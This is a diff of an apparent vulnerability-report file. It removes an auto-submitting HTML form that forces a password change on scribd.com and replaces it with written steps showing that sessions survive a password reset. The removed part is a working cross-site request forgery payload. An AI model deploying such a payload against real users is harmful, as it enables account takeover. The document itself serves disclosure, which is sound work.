@@ -1,20 +1,15 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
-</head>
-<body>
-    <form action="https://www.scribd.com/password" method="POST">
-  <input name="old_password" value="">
-  <input name="password" value="Hacked0x-ACE">
-  <input name="password_verification" value="Hacked0x-ACE">
-  <input name="no_flash_error" value="true">
-</form>
+# Proof of Concept
 
-<script>
-document.forms[0].submit()
-</script>
-</body>
-</html>
+1. Login to the victim account in Browser A.
+2. Login to the same account in Browser B.
+3. From Browser B, navigate to Account Settings.
+4. reset password.
+5. Return to Browser A.
+6. Refresh the page or access authenticated endpoints.
+7. Observe that the session remains valid and the user continues to have full authenticated access despite the password change.
+
+Expected Result:
+All previously issued sessions should be invalidated immediately after a password change.
+
+Actual Result:
+Previously established sessions remain active and continue to provide authenticated access.
